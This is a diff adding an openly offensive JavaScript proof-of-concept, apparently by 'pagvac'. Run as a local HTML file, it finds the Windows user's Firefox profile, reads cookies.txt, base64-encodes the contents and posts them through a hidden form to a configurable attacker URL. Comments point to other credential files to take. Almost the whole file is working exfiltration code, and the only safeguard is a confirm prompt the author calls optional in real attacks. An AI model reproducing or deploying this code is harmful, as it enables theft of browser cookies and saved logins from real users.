@@ -1,0 +1,162 @@
+document.write("<html><head></head><body><form method='POST'><input type='hidden' name='stolenfile'></form>");
+// This code was written by Tyler Akins and has been placed in the
+// public domain.  It would be nice if you left this header intact.
+// Base64 code from Tyler Akins -- http://rumkin.com
+
+var keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
+
+function encode64(input) {
+   var output = "";
+   var chr1, chr2, chr3;
+   var enc1, enc2, enc3, enc4;
+   var i = 0;
+
+   do {
+      chr1 = input.charCodeAt(i++);
+      chr2 = input.charCodeAt(i++);
+      chr3 = input.charCodeAt(i++);
+
+      enc1 = chr1 >> 2;
+      enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
+      enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
+      enc4 = chr3 & 63;
+
+      if (isNaN(chr2)) {
+         enc3 = enc4 = 64;
+      } else if (isNaN(chr3)) {
+         enc4 = 64;
+      }
+
+      output = output + keyStr.charAt(enc1) + keyStr.charAt(enc2) +
+         keyStr.charAt(enc3) + keyStr.charAt(enc4);
+   } while (i < input.length);
+
+   return output;
+}
+// end of Base64 code from Tyler Akins -- http://rumkin.com
+
+// VARIABLE DECLARATIONS
+var attackersURL = "http://192.168.0.171"; // replace URL value with your own!  for example http://ikwt.com/xt.php
+// interesting Mozilla Firefox files include cookies.txt, signons.txt, key3.db, bookmarks.bak
+var j=0, found=0;
+var strProfileContent, strFirefoxProfileLocation, strPayloadLocation, strProfileName, strHomeFolder;
+var file2steal, strFile2StealContent, strTmp;
+
+//alert(navigator.appName);
+
+// if IE
+if(navigator.appName=="Microsoft Internet Explorer")
+{
+        var req = new ActiveXObject("Microsoft.XMLHTTP");
+        var reqB = new ActiveXObject("Microsoft.XMLHTTP");
+}
+
+else
+{
+        var req = new XMLHttpRequest();
+        var reqB = new XMLHttpRequest();
+}
+
+strPayloadLocation=String(document.location);
+document.write("strPayloadLocation: " + strPayloadLocation + "<br>");
+
+// alert(strPayloadLocation.length);
+
+if(!document.domain)
+        document.write("<br>Running script on local context!!!<br><br>");
+else
+{
+        alert("This file must be run locally (i.e.: Windows desktop)!");
+        exit;
+}
+
+// get Windows home folder
+for(j=0; j<strPayloadLocation.length; j++)
+{
+                                //document.write(strPayloadLocation.charAt(j) + " ");
+                                if(strPayloadLocation.charAt(j)=="/")
+                                {
+                                        ++found;
+
+                                        // in order to obtain Windows user home folder we get up to 6th slash
+                                        // from document.location. i.e.: file:///C:/Documents%20and%20Settings/p0wn3dUser/
+                                        if(found==6)
+                                        {
+                                                strHomeFolder = strPayloadLocation.substring(0, j+1);
+                                                document.write("strHomeFolder: " + strHomeFolder + "<br>");
+                                                break;
+                                        }
+
+                                }
+}
+
+strFirefoxProfileLocation=strHomeFolder+"Application Data/Mozilla/Firefox/profiles.ini";
+
+if(!strHomeFolder)
+{
+        alert("This HTML file must be launched anywhere within your home folder!\ni.e.:\nC:\\Documents and Settings\\myusername\\\nC:\\Documents and Settings\\myusername\\My Documents\\\nC:\\Documents and Settings\\myusername\\Desktop\\");
+        exit;
+}
+
+document.write("strFirefoxProfileLocation: " + strFirefoxProfileLocation + "<br>");
+
+// get contents of strFirefoxProfileLocation
+try
+{
+                //document.write(strFirefoxProfileLocation+"<br>");
+                req.open("GET", strFirefoxProfileLocation, null);
+                req.send(null);
+                //alert(file2steal);
+                if(req.responseText)
+                {
+                        strProfileContent=req.responseText;
+                        document.write("profileContent:<br><br>" + strProfileContent + "<br><br>");
+
+                        strProfileName=strProfileContent.substring(strProfileContent.indexOf("/")+1, strProfileContent.length);
+                        strTmp=strProfileName;
+                        //alert(strProfileName);
+                        //alert(strProfileName.indexOf("\n"));
+                        //strProfileName=strTmp.substring(0, strProfileName.indexOf("\n")-1);
+                        strProfileName=strProfileName.substring(0, strProfileName.indexOf("\n")-1);
+                        //strProfileName.indexOf("\ ")
+                        document.write("StrProfileName: " + strProfileName + "<br>");
+                        //document.write(strProfileContent.indexOf("/")+"<br>");
+                }
+
+} catch (e) {};
+
+file2steal = strHomeFolder + "Application Data/Mozilla/Firefox/Profiles/" + strProfileName + "/cookies.txt";
+document.write("file2steal: "+ file2steal+"<br><br>");
+
+// get contents of file2steal
+try
+{
+                reqB.open("GET", file2steal, null);
+                reqB.send(null);
+
+                if(reqB.responseText)
+                {
+                        strFile2StealContent=reqB.responseText;
+                        document.write("strFile2StealContent:<br><br>" + reqB.responseText + "<br><br>");
+                        strFile2StealContent=encode64(reqB.responseText);
+                }
+
+} catch (e) {};
+
+document.forms[0].action=attackersURL;
+alert(document.forms[0].action);
+
+document.forms[0].stolenfile.value=strFile2StealContent;
+alert(document.forms[0].stolenfile.value);
+
+// confirm box only added for ethical reason. In a real-world scenario an attacker wouldnt even bother asking you
+// for permission before stealing a file from your filesystem!
+if(confirm("pagvac says:\n\Do you really want to submit your \"cookies.txt\" file to "+attackersURL+"\n???"))
+        document.forms[0].submit();
+else
+        exit;
+
+document.write("</body></html>");
+
+
+
